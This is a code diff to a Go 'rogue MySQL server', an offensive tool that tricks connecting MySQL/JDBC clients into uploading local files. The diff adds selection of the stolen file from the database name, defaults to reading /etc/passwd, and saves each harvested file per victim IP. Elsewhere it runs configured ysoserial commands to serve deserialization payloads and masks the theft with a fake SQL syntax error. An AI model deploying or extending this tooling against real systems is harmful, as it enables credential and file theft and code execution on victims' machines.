@@ -7,9 +7,11 @@ import (
     log "github.com/sirupsen/logrus"
     "gopkg.in/yaml.v2"
     "io/ioutil"
+    "net/url"
     "os"
     "os/exec"
     "path/filepath"
+    "regexp"
     "rogue_mysql_server/mysql"
     "strings"
     "sync"
@@ -29,14 +31,18 @@ type DB struct {
 }
 
 type Config struct {
-    Host             string              `yaml:"host"`
-    Port             string              `yaml:"port"`
-    FileList         []string            `yaml:"file_list"`
-    SavePath         string              `yaml:"save_path"`
-    Auth             bool                `yaml:"auth"`
-    Users            []map[string]string `yaml:"users"`
-    AlwaysRead       bool                `yaml:"always_read"`
-    VersionString    string              `yaml:"version_string"`
+    Host          string `yaml:"host"`
+    Port          string `yaml:"port"`
+    VersionString string `yaml:"version_string"`
+
+    FileList         []string `yaml:"file_list"`
+    SavePath         string   `yaml:"save_path"`
+    AlwaysRead       bool     `yaml:"always_read"`
+    FromDatabaseName bool     `yaml:"from_database_name"`
+
+    Auth  bool                `yaml:"auth"`
+    Users []map[string]string `yaml:"users"`
+
     JdbcExploit      bool                `yaml:"jdbc_exploit"`
     YsoserialCommand map[string][]string `yaml:"ysoserial_command"`
     AlwaysExploit    bool                `yaml:"always_exploit"`
@@ -77,6 +83,11 @@ func CmdExec(args []string) []byte {
     return out
 }
 
+func sanitizeFilename(filename string) string {
+    r := regexp.MustCompile("[^A-Za-z0-9./_-]")
+    return r.ReplaceAllString(filename, "")
+}
+
 func main() {
     formatter := new(log.TextFormatter)
     formatter.FullTimestamp = true
@@ -106,9 +117,9 @@ func main() {
     db.YsoserialOutput = map[string][]byte{}
 
     if config.JdbcExploit {
-            for index, command := range config.YsoserialCommand {
-                db.YsoserialOutput[index] = CmdExec(command)
-            }
+        for index, command := range config.YsoserialCommand {
+            db.YsoserialOutput[index] = CmdExec(command)
+        }
     }
 
     var authServer mysql.AuthServer
@@ -156,7 +167,7 @@ func main() {
 
 // NewConnection is part of the mysql.Handler interface.
 func (db *DB) NewConnection(c *mysql.Conn) {
-    log.Infof("New client from addr [%s] logged in with username [%s], ID [%d]", c.RemoteAddr(), c.User, c.ConnectionID)
+    log.Infof("New client from addr [%s] logged in with username [%s], database [%s], ID [%d]", c.RemoteAddr(), c.User, c.SchemaName, c.ConnectionID)
 
     if c.ConnAttrs != nil {
         log.Info("==== ATTRS ====")
@@ -230,37 +241,51 @@ func (db *DB) ComQuery(c *mysql.Conn, query string, callback func(*sqltypes.Resu
         return nil
     }
 
-    length := len(db.config.FileList)
-    if length == 0 {
-        return nil
-    } else {
-        filename := db.config.FileList[db.fileIndex[c.ConnectionID]]
-        db.mapLock.Lock()
-        db.fileIndex[c.ConnectionID] = (db.fileIndex[c.ConnectionID] + 1) % length
-        db.mapLock.Unlock()
-        data := c.RequestFile(filename)
-        log.Infof("Now try to read file [%s] from addr [%s], ID [%d]", filename, c.RemoteAddr(), c.ConnectionID)
+    filename := "/etc/passwd"
 
-        if data == nil || len(data) == 0 {
-            log.Infof("Read failed, file may not exist in client")
+    if !db.config.FromDatabaseName {
+        length := len(db.config.FileList)
+        if length > 0 {
+            db.mapLock.Lock()
+            filename = db.config.FileList[db.fileIndex[c.ConnectionID]]
+            db.fileIndex[c.ConnectionID] = (db.fileIndex[c.ConnectionID] + 1) % length
+            db.mapLock.Unlock()
         } else {
-            path := fmt.Sprintf("%s/%s", db.config.SavePath, strings.Split(c.RemoteAddr().String(), ":")[0])
+            log.Infof("len(FileList) == 0, use [%s] for backup", filename)
+        }
+    } else {
+        decodedName, err := url.QueryUnescape(c.SchemaName)
+        if err == nil {
+            filename = decodedName
+        } else {
+            log.Infof("Database name [%s] decode error, use [%s] for backup", c.SchemaName, filename)
+        }
+    }
 
-            if _, err := os.Stat(path); os.IsNotExist(err) {
-                os.MkdirAll(path, 0755)
-            }
+    data := c.RequestFile(filename)
+    log.Infof("Now try to read file [%s] from addr [%s], ID [%d]", filename, c.RemoteAddr(), c.ConnectionID)
 
-            filename := strings.Split(filename, "/")
-            filename = filename[len(filename)-1:]
+    if data == nil || len(data) == 0 {
+        log.Infof("Read failed, file may not exist in client")
+    } else {
+        path := fmt.Sprintf("%s/%s", db.config.SavePath, strings.Split(c.RemoteAddr().String(), ":")[0])
 
-            path = fmt.Sprintf("%s/%v-%s", path, time.Now().Unix(), filename[0])
-            ioutil.WriteFile(path, data, 0644)
-            log.Infof("Read success, stored at [%s]", path)
+        if _, err := os.Stat(path); os.IsNotExist(err) {
+            os.MkdirAll(path, 0755)
         }
 
-        c.WriteErrorResponse(fmt.Sprintf("You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%s' at line 1", query))
-        return nil
+        filename = sanitizeFilename(filename)
+        filenameArr := strings.Split(filename, "/")
+        saveName := filenameArr[len(filenameArr)-1:]
+
+        path = fmt.Sprintf("%s/%v-%s", path, time.Now().Unix(), saveName[0])
+        ioutil.WriteFile(path, data, 0644)
+        log.Infof("Read success, stored at [%s]", path)
     }
+
+    c.WriteErrorResponse(fmt.Sprintf("You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%s' at line 1", query))
+    return nil
+
 }
 
 // WarningCount is part of the mysql.Handler interface.
